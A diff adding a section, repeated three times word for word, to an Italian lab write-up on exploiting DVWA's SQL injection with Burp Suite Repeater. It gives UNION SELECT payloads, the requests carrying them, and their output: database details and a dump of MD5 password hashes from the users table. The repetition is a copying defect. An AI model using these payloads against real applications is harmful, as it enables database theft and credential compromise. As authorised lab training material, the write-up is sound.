@@ -2160,11 +2160,1641 @@ Username e hash password estratti dalla tabella users.
 
 ---
 
+## DVWA SQL Injection with Burp Suite Repeater
+
+Durante il laboratorio è stata replicata la vulnerabilità SQL Injection di DVWA usando Burp Suite.
+
+L’obiettivo era intercettare la richiesta HTTP generata dal form vulnerabile, inviarla a Repeater, modificare manualmente il parametro vulnerabile `id` e analizzare la risposta del server.
+
+Target:
+
+```text
+http://192.168.1.100/dvwa/
+```
+
+Applicazione:
+
+```text
+DVWA - Damn Vulnerable Web Application
+```
+
+Credenziali applicative:
+
+```text
+Username: admin
+Password: password
+```
+
+Livello sicurezza DVWA:
+
+```text
+Security Level: low
+```
+
+---
+
+## Obiettivo
+
+L’obiettivo era sfruttare la SQL Injection nella sezione:
+
+```text
+DVWA → SQL Injection
+```
+
+Parametro vulnerabile:
+
+```text
+id
+```
+
+Richiesta originale:
+
+```http
+GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
+Host: 192.168.1.100
+Cookie: security=low; PHPSESSID=<session_id>
+```
+
+---
+
+## Flusso Burp Suite
+
+Procedura usata:
+
+```text
+1. Aprire Burp Suite
+2. Usare il browser interno di Burp
+3. Accedere a DVWA
+4. Impostare Security Level su low
+5. Aprire la sezione SQL Injection
+6. Inserire User ID = 1
+7. Inviare la richiesta
+8. Trovare la richiesta in Proxy → HTTP history
+9. Inviare la richiesta a Repeater
+10. Modificare il parametro id
+11. Premere Send
+12. Analizzare la Response
+```
+
+---
+
+## Avvio Burp Suite
+
+Comando da Kali:
+
+```bash
+burpsuite
+```
+
+Scelte iniziali:
+
+```text
+Temporary project
+Use Burp defaults
+Start Burp
+```
+
+---
+
+## Browser interno di Burp
+
+Da Burp:
+
+```text
+Proxy → Intercept → Open browser
+```
+
+Nel browser interno aprire:
+
+```text
+http://192.168.1.100/dvwa/
+```
+
+Login:
+
+```text
+Username: admin
+Password: password
+```
+
+Poi impostare:
+
+```text
+DVWA Security → low → Submit
+```
+
+---
+
+## Apertura sezione SQL Injection
+
+Nel menu DVWA cliccare:
+
+```text
+SQL Injection
+```
+
+Nel campo:
+
+```text
+User ID
+```
+
+inserire:
+
+```text
+1
+```
+
+Poi cliccare:
+
+```text
+Submit
+```
+
+---
+
+## Individuazione richiesta in Burp
+
+In Burp andare su:
+
+```text
+Proxy → HTTP history
+```
+
+Cercare la richiesta:
+
+```http
+GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
+Host: 192.168.1.100
+```
+
+Poi:
+
+```text
+Tasto destro → Send to Repeater
+```
+
+---
+
+## Richiesta originale in Repeater
+
+In Repeater la richiesta originale era simile a:
+
+```http
+GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
+Host: 192.168.1.100
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Referer: http://192.168.1.100/dvwa/vulnerabilities/sqli/
+Accept-Encoding: gzip, deflate, br
+Cookie: security=low; PHPSESSID=<session_id>
+Connection: keep-alive
+```
+
+Parametro da modificare:
+
+```text
+id=1
+```
+
+---
+
+## Test UNION SELECT 1,2
+
+Payload SQL originale:
+
+```sql
+1' UNION SELECT 1,2 #
+```
+
+Payload URL encoded:
+
+```text
+1%27%20UNION%20SELECT%201,2%20%23
+```
+
+Richiesta modificata in Repeater:
+
+```http
+GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%201,2%20%23&Submit=Submit HTTP/1.1
+Host: 192.168.1.100
+Cookie: security=low; PHPSESSID=<session_id>
+```
+
+Dopo avere modificato la richiesta:
+
+```text
+Click Send
+```
+
+Risultato nella Response:
+
+```text
+First name: admin
+Surname: admin
+
+First name: 1
+Surname: 2
+```
+
+Interpretazione:
+
+```text
+UNION SELECT funziona.
+La query accetta 2 colonne.
+Entrambe le colonne vengono stampate nella risposta HTML.
+La SQL Injection è sfruttabile tramite Burp Repeater.
+```
+
+---
+
+## Estrazione nome database e versione
+
+Payload SQL originale:
+
+```sql
+1' UNION SELECT database(),version() #
+```
+
+Payload URL encoded:
+
+```text
+1%27%20UNION%20SELECT%20database(),version()%20%23
+```
+
+Richiesta in Repeater:
+
+```http
+GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database(),version()%20%23&Submit=Submit HTTP/1.1
+Host: 192.168.1.100
+Cookie: security=low; PHPSESSID=<session_id>
+```
+
+Risultato atteso:
+
+```text
+First name: dvwa
+Surname: 5.0.51a-3ubuntu5
+```
+
+Interpretazione:
+
+```text
+Database corrente: dvwa
+Versione MySQL: 5.0.51a-3ubuntu5
+```
+
+---
+
+## Estrazione utente database
+
+Payload SQL originale:
+
+```sql
+1' UNION SELECT user(),@@version #
+```
+
+Payload URL encoded:
+
+```text
+1%27%20UNION%20SELECT%20user(),@@version%20%23
+```
+
+Richiesta in Repeater:
+
+```http
+GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user(),@@version%20%23&Submit=Submit HTTP/1.1
+Host: 192.168.1.100
+Cookie: security=low; PHPSESSID=<session_id>
+```
+
+Risultato atteso:
+
+```text
+First name: root@localhost
+Surname: 5.0.51a-3ubuntu5
+```
+
+Interpretazione:
+
+```text
+L’applicazione DVWA interroga il database come root@localhost.
+```
+
+---
+
+## Dump utenti e hash tramite Burp Repeater
+
+Payload SQL originale:
+
+```sql
+1' UNION SELECT user,password FROM users #
+```
+
+Payload URL encoded:
+
+```text
+1%27%20UNION%20SELECT%20user,password%20FROM%20users%20%23
+```
+
+Richiesta modificata:
+
+```http
+GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users%20%23&Submit=Submit HTTP/1.1
+Host: 192.168.1.100
+Cookie: security=low; PHPSESSID=<session_id>
+```
+
+Risultato nella Response:
+
+```text
+First name: admin
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+
+First name: gordonb
+Surname: e99a18c428cb38d5f260853678922e03
+
+First name: 1337
+Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+
+First name: pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+
+First name: smithy
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+```
+
+Interpretazione:
+
+```text
+La SQL Injection permette di estrarre username e hash password dalla tabella users.
+Gli hash sembrano MD5.
+```
+
+Hash noto:
+
+```text
+5f4dcc3b5aa765d61d8327deb882cf99 = password
+```
+
+Credenziali applicative confermate:
+
+```text
+admin / password
+smithy / password
+```
+
+---
+
+## Differenza tra browser e Burp Repeater
+
+Dal browser:
+
+```text
+Si inserisce il payload nel form web.
+La richiesta viene generata automaticamente.
+```
+
+Da Burp Repeater:
+
+```text
+Si modifica direttamente la richiesta HTTP.
+Si controlla manualmente il parametro vulnerabile.
+Si può ripetere lo stesso test molte volte senza usare il form.
+Si analizza la risposta grezza del server.
+```
+
+Questo è importante perché in un test reale spesso si lavora direttamente sulle richieste HTTP.
+
+---
+
+## Cosa osservare nella Response
+
+In Repeater controllare sempre:
+
+```text
+HTTP status code
+Response headers
+Response body
+Output HTML
+Messaggi di errore SQL
+Dati restituiti dalla query
+Cookie e livello security
+```
+
+Nel laboratorio la Response ha confermato:
+
+```text
+HTTP/1.1 200 OK
+Server: Apache/2.2.8 (Ubuntu) DAV/2
+X-Powered-By: PHP/5.2.4-2ubuntu5.10
+DVWA Security Level: low
+Username: admin
+PHPIDS: disabled
+```
+
+---
+
+## Catena completa con Burp
+
+```text
+Aprire Burp Suite
+↓
+Proxy → Open browser
+↓
+Login DVWA con admin/password
+↓
+Impostare security=low
+↓
+Aprire SQL Injection
+↓
+Inviare User ID = 1
+↓
+Proxy → HTTP history
+↓
+Send to Repeater
+↓
+Modificare id=1
+↓
+Payload: 1' UNION SELECT 1,2 #
+↓
+Send
+↓
+Conferma colonne: First name 1 / Surname 2
+↓
+Payload: database(),version()
+↓
+Estrazione database e versione
+↓
+Payload: user,password FROM users
+↓
+Dump utenti e hash
+```
+
+---
+
+## Payload principali in chiaro
+
+```sql
+1' UNION SELECT 1,2 #
+```
+
+```sql
+1' UNION SELECT database(),version() #
+```
+
+```sql
+1' UNION SELECT user(),@@version #
+```
+
+```sql
+1' UNION SELECT user,password FROM users #
+```
+
+---
+
+## Payload URL encoded
+
+```text
+1%27%20UNION%20SELECT%201,2%20%23
+```
+
+```text
+1%27%20UNION%20SELECT%20database(),version()%20%23
+```
+
+```text
+1%27%20UNION%20SELECT%20user(),@@version%20%23
+```
+
+```text
+1%27%20UNION%20SELECT%20user,password%20FROM%20users%20%23
+```
+
+---
+
+## Lezioni apprese
+
+```text
+Burp Suite permette di intercettare e modificare richieste HTTP.
+HTTP history serve per trovare la richiesta interessante.
+Repeater serve per ripetere e modificare manualmente la richiesta.
+Il parametro id era vulnerabile a SQL Injection.
+UNION SELECT ha confermato 2 colonne.
+La Response HTML mostra direttamente i dati estratti.
+Il cookie security=low è necessario per mantenere DVWA in modalità vulnerabile.
+Il PHPSESSID mantiene la sessione autenticata.
+```
+
+---
+
+## Risultato finale
+
+```text
+SQL Injection confermata anche tramite Burp Suite.
+Richiesta intercettata correttamente.
+Richiesta inviata a Repeater.
+Parametro id modificato manualmente.
+UNION SELECT funzionante.
+Dump utenti e hash completato dalla Response.
+```
+
+---
+
+## DVWA SQL Injection with Burp Suite Repeater
+
+Durante il laboratorio è stata replicata la vulnerabilità SQL Injection di DVWA usando Burp Suite.
+
+L’obiettivo era intercettare la richiesta HTTP generata dal form vulnerabile, inviarla a Repeater, modificare manualmente il parametro vulnerabile `id` e analizzare la risposta del server.
+
+Target:
+
+```text
+http://192.168.1.100/dvwa/
+```
+
+Applicazione:
+
+```text
+DVWA - Damn Vulnerable Web Application
+```
+
+Credenziali applicative:
+
+```text
+Username: admin
+Password: password
+```
+
+Livello sicurezza DVWA:
+
+```text
+Security Level: low
+```
+
+---
+
+## Obiettivo
+
+L’obiettivo era sfruttare la SQL Injection nella sezione:
+
+```text
+DVWA → SQL Injection
+```
+
+Parametro vulnerabile:
+
+```text
+id
+```
+
+Richiesta originale:
+
+```http
+GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
+Host: 192.168.1.100
+Cookie: security=low; PHPSESSID=<session_id>
+```
+
+---
+
+## Flusso Burp Suite
+
+Procedura usata:
+
+```text
+1. Aprire Burp Suite
+2. Usare il browser interno di Burp
+3. Accedere a DVWA
+4. Impostare Security Level su low
+5. Aprire la sezione SQL Injection
+6. Inserire User ID = 1
+7. Inviare la richiesta
+8. Trovare la richiesta in Proxy → HTTP history
+9. Inviare la richiesta a Repeater
+10. Modificare il parametro id
+11. Premere Send
+12. Analizzare la Response
+```
+
+---
+
+## Avvio Burp Suite
+
+Comando da Kali:
+
+```bash
+burpsuite
+```
+
+Scelte iniziali:
+
+```text
+Temporary project
+Use Burp defaults
+Start Burp
+```
+
+---
+
+## Browser interno di Burp
+
+Da Burp:
+
+```text
+Proxy → Intercept → Open browser
+```
+
+Nel browser interno aprire:
+
+```text
+http://192.168.1.100/dvwa/
+```
+
+Login:
+
+```text
+Username: admin
+Password: password
+```
+
+Poi impostare:
+
+```text
+DVWA Security → low → Submit
+```
+
+---
+
+## Apertura sezione SQL Injection
+
+Nel menu DVWA cliccare:
+
+```text
+SQL Injection
+```
+
+Nel campo:
+
+```text
+User ID
+```
+
+inserire:
+
+```text
+1
+```
+
+Poi cliccare:
+
+```text
+Submit
+```
+
+---
+
+## Individuazione richiesta in Burp
+
+In Burp andare su:
+
+```text
+Proxy → HTTP history
+```
+
+Cercare la richiesta:
+
+```http
+GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
+Host: 192.168.1.100
+```
+
+Poi:
+
+```text
+Tasto destro → Send to Repeater
+```
+
+---
+
+## Richiesta originale in Repeater
+
+In Repeater la richiesta originale era simile a:
+
+```http
+GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
+Host: 192.168.1.100
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Referer: http://192.168.1.100/dvwa/vulnerabilities/sqli/
+Accept-Encoding: gzip, deflate, br
+Cookie: security=low; PHPSESSID=<session_id>
+Connection: keep-alive
+```
+
+Parametro da modificare:
+
+```text
+id=1
+```
+
+---
+
+## Test UNION SELECT 1,2
+
+Payload SQL originale:
+
+```sql
+1' UNION SELECT 1,2 #
+```
+
+Payload URL encoded:
+
+```text
+1%27%20UNION%20SELECT%201,2%20%23
+```
+
+Richiesta modificata in Repeater:
+
+```http
+GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%201,2%20%23&Submit=Submit HTTP/1.1
+Host: 192.168.1.100
+Cookie: security=low; PHPSESSID=<session_id>
+```
+
+Dopo avere modificato la richiesta:
+
+```text
+Click Send
+```
+
+Risultato nella Response:
+
+```text
+First name: admin
+Surname: admin
+
+First name: 1
+Surname: 2
+```
+
+Interpretazione:
+
+```text
+UNION SELECT funziona.
+La query accetta 2 colonne.
+Entrambe le colonne vengono stampate nella risposta HTML.
+La SQL Injection è sfruttabile tramite Burp Repeater.
+```
+
+---
+
+## Estrazione nome database e versione
+
+Payload SQL originale:
+
+```sql
+1' UNION SELECT database(),version() #
+```
+
+Payload URL encoded:
+
+```text
+1%27%20UNION%20SELECT%20database(),version()%20%23
+```
+
+Richiesta in Repeater:
+
+```http
+GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database(),version()%20%23&Submit=Submit HTTP/1.1
+Host: 192.168.1.100
+Cookie: security=low; PHPSESSID=<session_id>
+```
+
+Risultato atteso:
+
+```text
+First name: dvwa
+Surname: 5.0.51a-3ubuntu5
+```
+
+Interpretazione:
+
+```text
+Database corrente: dvwa
+Versione MySQL: 5.0.51a-3ubuntu5
+```
+
+---
+
+## Estrazione utente database
+
+Payload SQL originale:
+
+```sql
+1' UNION SELECT user(),@@version #
+```
+
+Payload URL encoded:
+
+```text
+1%27%20UNION%20SELECT%20user(),@@version%20%23
+```
+
+Richiesta in Repeater:
+
+```http
+GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user(),@@version%20%23&Submit=Submit HTTP/1.1
+Host: 192.168.1.100
+Cookie: security=low; PHPSESSID=<session_id>
+```
+
+Risultato atteso:
+
+```text
+First name: root@localhost
+Surname: 5.0.51a-3ubuntu5
+```
+
+Interpretazione:
+
+```text
+L’applicazione DVWA interroga il database come root@localhost.
+```
+
+---
+
+## Dump utenti e hash tramite Burp Repeater
+
+Payload SQL originale:
+
+```sql
+1' UNION SELECT user,password FROM users #
+```
+
+Payload URL encoded:
+
+```text
+1%27%20UNION%20SELECT%20user,password%20FROM%20users%20%23
+```
+
+Richiesta modificata:
+
+```http
+GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users%20%23&Submit=Submit HTTP/1.1
+Host: 192.168.1.100
+Cookie: security=low; PHPSESSID=<session_id>
+```
+
+Risultato nella Response:
+
+```text
+First name: admin
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+
+First name: gordonb
+Surname: e99a18c428cb38d5f260853678922e03
+
+First name: 1337
+Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+
+First name: pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+
+First name: smithy
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+```
+
+Interpretazione:
+
+```text
+La SQL Injection permette di estrarre username e hash password dalla tabella users.
+Gli hash sembrano MD5.
+```
+
+Hash noto:
+
+```text
+5f4dcc3b5aa765d61d8327deb882cf99 = password
+```
+
+Credenziali applicative confermate:
+
+```text
+admin / password
+smithy / password
+```
+
+---
+
+## Differenza tra browser e Burp Repeater
+
+Dal browser:
+
+```text
+Si inserisce il payload nel form web.
+La richiesta viene generata automaticamente.
+```
+
+Da Burp Repeater:
+
+```text
+Si modifica direttamente la richiesta HTTP.
+Si controlla manualmente il parametro vulnerabile.
+Si può ripetere lo stesso test molte volte senza usare il form.
+Si analizza la risposta grezza del server.
+```
+
+Questo è importante perché in un test reale spesso si lavora direttamente sulle richieste HTTP.
+
+---
+
+## Cosa osservare nella Response
+
+In Repeater controllare sempre:
+
+```text
+HTTP status code
+Response headers
+Response body
+Output HTML
+Messaggi di errore SQL
+Dati restituiti dalla query
+Cookie e livello security
+```
+
+Nel laboratorio la Response ha confermato:
+
+```text
+HTTP/1.1 200 OK
+Server: Apache/2.2.8 (Ubuntu) DAV/2
+X-Powered-By: PHP/5.2.4-2ubuntu5.10
+DVWA Security Level: low
+Username: admin
+PHPIDS: disabled
+```
+
+---
+
+## Catena completa con Burp
+
+```text
+Aprire Burp Suite
+↓
+Proxy → Open browser
+↓
+Login DVWA con admin/password
+↓
+Impostare security=low
+↓
+Aprire SQL Injection
+↓
+Inviare User ID = 1
+↓
+Proxy → HTTP history
+↓
+Send to Repeater
+↓
+Modificare id=1
+↓
+Payload: 1' UNION SELECT 1,2 #
+↓
+Send
+↓
+Conferma colonne: First name 1 / Surname 2
+↓
+Payload: database(),version()
+↓
+Estrazione database e versione
+↓
+Payload: user,password FROM users
+↓
+Dump utenti e hash
+```
+
+---
+
+## Payload principali in chiaro
+
+```sql
+1' UNION SELECT 1,2 #
+```
+
+```sql
+1' UNION SELECT database(),version() #
+```
+
+```sql
+1' UNION SELECT user(),@@version #
+```
+
+```sql
+1' UNION SELECT user,password FROM users #
+```
+
+---
+
+## Payload URL encoded
+
+```text
+1%27%20UNION%20SELECT%201,2%20%23
+```
+
+```text
+1%27%20UNION%20SELECT%20database(),version()%20%23
+```
+
+```text
+1%27%20UNION%20SELECT%20user(),@@version%20%23
+```
+
+```text
+1%27%20UNION%20SELECT%20user,password%20FROM%20users%20%23
+```
+
+---
+
+## Lezioni apprese
+
+```text
+Burp Suite permette di intercettare e modificare richieste HTTP.
+HTTP history serve per trovare la richiesta interessante.
+Repeater serve per ripetere e modificare manualmente la richiesta.
+Il parametro id era vulnerabile a SQL Injection.
+UNION SELECT ha confermato 2 colonne.
+La Response HTML mostra direttamente i dati estratti.
+Il cookie security=low è necessario per mantenere DVWA in modalità vulnerabile.
+Il PHPSESSID mantiene la sessione autenticata.
+```
+
+---
+
+## Risultato finale
+
+```text
+SQL Injection confermata anche tramite Burp Suite.
+Richiesta intercettata correttamente.
+Richiesta inviata a Repeater.
+Parametro id modificato manualmente.
+UNION SELECT funzionante.
+Dump utenti e hash completato dalla Response.
+```
+
+---
+
+
+## DVWA SQL Injection with Burp Suite Repeater
+
+Durante il laboratorio è stata replicata la vulnerabilità SQL Injection di DVWA usando Burp Suite.
+
+L’obiettivo era intercettare la richiesta HTTP generata dal form vulnerabile, inviarla a Repeater, modificare manualmente il parametro vulnerabile `id` e analizzare la risposta del server.
+
+Target:
+
+```text
+http://192.168.1.100/dvwa/
+```
+
+Applicazione:
+
+```text
+DVWA - Damn Vulnerable Web Application
+```
+
+Credenziali applicative:
+
+```text
+Username: admin
+Password: password
+```
+
+Livello sicurezza DVWA:
+
+```text
+Security Level: low
+```
+
+---
+
+## Obiettivo
+
+L’obiettivo era sfruttare la SQL Injection nella sezione:
+
+```text
+DVWA → SQL Injection
+```
+
+Parametro vulnerabile:
+
+```text
+id
+```
+
+Richiesta originale:
+
+```http
+GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
+Host: 192.168.1.100
+Cookie: security=low; PHPSESSID=<session_id>
+```
+
+---
+
+## Flusso Burp Suite
+
+Procedura usata:
+
+```text
+1. Aprire Burp Suite
+2. Usare il browser interno di Burp
+3. Accedere a DVWA
+4. Impostare Security Level su low
+5. Aprire la sezione SQL Injection
+6. Inserire User ID = 1
+7. Inviare la richiesta
+8. Trovare la richiesta in Proxy → HTTP history
+9. Inviare la richiesta a Repeater
+10. Modificare il parametro id
+11. Premere Send
+12. Analizzare la Response
+```
+
+---
+
+## Avvio Burp Suite
+
+Comando da Kali:
+
+```bash
+burpsuite
+```
+
+Scelte iniziali:
+
+```text
+Temporary project
+Use Burp defaults
+Start Burp
+```
+
+---
+
+## Browser interno di Burp
+
+Da Burp:
+
+```text
+Proxy → Intercept → Open browser
+```
+
+Nel browser interno aprire:
+
+```text
+http://192.168.1.100/dvwa/
+```
+
+Login:
+
+```text
+Username: admin
+Password: password
+```
+
+Poi impostare:
+
+```text
+DVWA Security → low → Submit
+```
+
+---
+
+## Apertura sezione SQL Injection
+
+Nel menu DVWA cliccare:
+
+```text
+SQL Injection
+```
+
+Nel campo:
+
+```text
+User ID
+```
+
+inserire:
+
+```text
+1
+```
+
+Poi cliccare:
+
+```text
+Submit
+```
+
+---
+
+## Individuazione richiesta in Burp
+
+In Burp andare su:
+
+```text
+Proxy → HTTP history
+```
+
+Cercare la richiesta:
+
+```http
+GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
+Host: 192.168.1.100
+```
+
+Poi:
+
+```text
+Tasto destro → Send to Repeater
+```
+
+---
+
+## Richiesta originale in Repeater
+
+In Repeater la richiesta originale era simile a:
+
+```http
+GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
+Host: 192.168.1.100
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Referer: http://192.168.1.100/dvwa/vulnerabilities/sqli/
+Accept-Encoding: gzip, deflate, br
+Cookie: security=low; PHPSESSID=<session_id>
+Connection: keep-alive
+```
+
+Parametro da modificare:
+
+```text
+id=1
+```
+
+---
+
+## Test UNION SELECT 1,2
+
+Payload SQL originale:
+
+```sql
+1' UNION SELECT 1,2 #
+```
+
+Payload URL encoded:
+
+```text
+1%27%20UNION%20SELECT%201,2%20%23
+```
+
+Richiesta modificata in Repeater:
+
+```http
+GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%201,2%20%23&Submit=Submit HTTP/1.1
+Host: 192.168.1.100
+Cookie: security=low; PHPSESSID=<session_id>
+```
+
+Dopo avere modificato la richiesta:
+
+```text
+Click Send
+```
+
+Risultato nella Response:
+
+```text
+First name: admin
+Surname: admin
+
+First name: 1
+Surname: 2
+```
+
+Interpretazione:
+
+```text
+UNION SELECT funziona.
+La query accetta 2 colonne.
+Entrambe le colonne vengono stampate nella risposta HTML.
+La SQL Injection è sfruttabile tramite Burp Repeater.
+```
+
+---
+
+## Estrazione nome database e versione
+
+Payload SQL originale:
+
+```sql
+1' UNION SELECT database(),version() #
+```
+
+Payload URL encoded:
+
+```text
+1%27%20UNION%20SELECT%20database(),version()%20%23
+```
+
+Richiesta in Repeater:
+
+```http
+GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database(),version()%20%23&Submit=Submit HTTP/1.1
+Host: 192.168.1.100
+Cookie: security=low; PHPSESSID=<session_id>
+```
+
+Risultato atteso:
+
+```text
+First name: dvwa
+Surname: 5.0.51a-3ubuntu5
+```
+
+Interpretazione:
+
+```text
+Database corrente: dvwa
+Versione MySQL: 5.0.51a-3ubuntu5
+```
+
+---
+
+## Estrazione utente database
+
+Payload SQL originale:
+
+```sql
+1' UNION SELECT user(),@@version #
+```
+
+Payload URL encoded:
+
+```text
+1%27%20UNION%20SELECT%20user(),@@version%20%23
+```
+
+Richiesta in Repeater:
+
+```http
+GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user(),@@version%20%23&Submit=Submit HTTP/1.1
+Host: 192.168.1.100
+Cookie: security=low; PHPSESSID=<session_id>
+```
+
+Risultato atteso:
+
+```text
+First name: root@localhost
+Surname: 5.0.51a-3ubuntu5
+```
+
+Interpretazione:
+
+```text
+L’applicazione DVWA interroga il database come root@localhost.
+```
+
+---
+
+## Dump utenti e hash tramite Burp Repeater
+
+Payload SQL originale:
+
+```sql
+1' UNION SELECT user,password FROM users #
+```
+
+Payload URL encoded:
+
+```text
+1%27%20UNION%20SELECT%20user,password%20FROM%20users%20%23
+```
+
+Richiesta modificata:
+
+```http
+GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users%20%23&Submit=Submit HTTP/1.1
+Host: 192.168.1.100
+Cookie: security=low; PHPSESSID=<session_id>
+```
+
+Risultato nella Response:
+
+```text
+First name: admin
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+
+First name: gordonb
+Surname: e99a18c428cb38d5f260853678922e03
+
+First name: 1337
+Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+
+First name: pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+
+First name: smithy
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+```
+
+Interpretazione:
+
+```text
+La SQL Injection permette di estrarre username e hash password dalla tabella users.
+Gli hash sembrano MD5.
+```
+
+Hash noto:
+
+```text
+5f4dcc3b5aa765d61d8327deb882cf99 = password
+```
+
+Credenziali applicative confermate:
+
+```text
+admin / password
+smithy / password
+```
+
+---
+
+## Differenza tra browser e Burp Repeater
+
+Dal browser:
+
+```text
+Si inserisce il payload nel form web.
+La richiesta viene generata automaticamente.
+```
+
+Da Burp Repeater:
+
+```text
+Si modifica direttamente la richiesta HTTP.
+Si controlla manualmente il parametro vulnerabile.
+Si può ripetere lo stesso test molte volte senza usare il form.
+Si analizza la risposta grezza del server.
+```
+
+Questo è importante perché in un test reale spesso si lavora direttamente sulle richieste HTTP.
+
+---
+
+## Cosa osservare nella Response
+
+In Repeater controllare sempre:
+
+```text
+HTTP status code
+Response headers
+Response body
+Output HTML
+Messaggi di errore SQL
+Dati restituiti dalla query
+Cookie e livello security
+```
+
+Nel laboratorio la Response ha confermato:
+
+```text
+HTTP/1.1 200 OK
+Server: Apache/2.2.8 (Ubuntu) DAV/2
+X-Powered-By: PHP/5.2.4-2ubuntu5.10
+DVWA Security Level: low
+Username: admin
+PHPIDS: disabled
+```
+
+---
+
+## Catena completa con Burp
+
+```text
+Aprire Burp Suite
+↓
+Proxy → Open browser
+↓
+Login DVWA con admin/password
+↓
+Impostare security=low
+↓
+Aprire SQL Injection
+↓
+Inviare User ID = 1
+↓
+Proxy → HTTP history
+↓
+Send to Repeater
+↓
+Modificare id=1
+↓
+Payload: 1' UNION SELECT 1,2 #
+↓
+Send
+↓
+Conferma colonne: First name 1 / Surname 2
+↓
+Payload: database(),version()
+↓
+Estrazione database e versione
+↓
+Payload: user,password FROM users
+↓
+Dump utenti e hash
+```
+
+---
+
+## Payload principali in chiaro
+
+```sql
+1' UNION SELECT 1,2 #
+```
+
+```sql
+1' UNION SELECT database(),version() #
+```
+
+```sql
+1' UNION SELECT user(),@@version #
+```
+
+```sql
+1' UNION SELECT user,password FROM users #
+```
+
+---
+
+## Payload URL encoded
+
+```text
+1%27%20UNION%20SELECT%201,2%20%23
+```
+
+```text
+1%27%20UNION%20SELECT%20database(),version()%20%23
+```
+
+```text
+1%27%20UNION%20SELECT%20user(),@@version%20%23
+```
+
+```text
+1%27%20UNION%20SELECT%20user,password%20FROM%20users%20%23
+```
+
+---
+
+## Lezioni apprese
+
+```text
+Burp Suite permette di intercettare e modificare richieste HTTP.
+HTTP history serve per trovare la richiesta interessante.
+Repeater serve per ripetere e modificare manualmente la richiesta.
+Il parametro id era vulnerabile a SQL Injection.
+UNION SELECT ha confermato 2 colonne.
+La Response HTML mostra direttamente i dati estratti.
+Il cookie security=low è necessario per mantenere DVWA in modalità vulnerabile.
+Il PHPSESSID mantiene la sessione autenticata.
+```
+
+---
+
+## Risultato finale
+
+```text
+SQL Injection confermata anche tramite Burp Suite.
+Richiesta intercettata correttamente.
+Richiesta inviata a Repeater.
+Parametro id modificato manualmente.
+UNION SELECT funzionante.
+Dump utenti e hash completato dalla Response.
+```
+
+---
+
 ## Nota etica
 
-Questo test è stato svolto esclusivamente su DVWA, applicazione volutamente vulnerabile installata su Metasploitable2 in ambiente locale autorizzato.
+Questo test è stato svolto esclusivamente su DVWA installata su Metasploitable2 in un laboratorio locale autorizzato.
 
-Non utilizzare questi payload contro siti reali senza autorizzazione esplicita.
+Non utilizzare queste tecniche contro applicazioni reali senza autorizzazione esplicita.
 
 
 
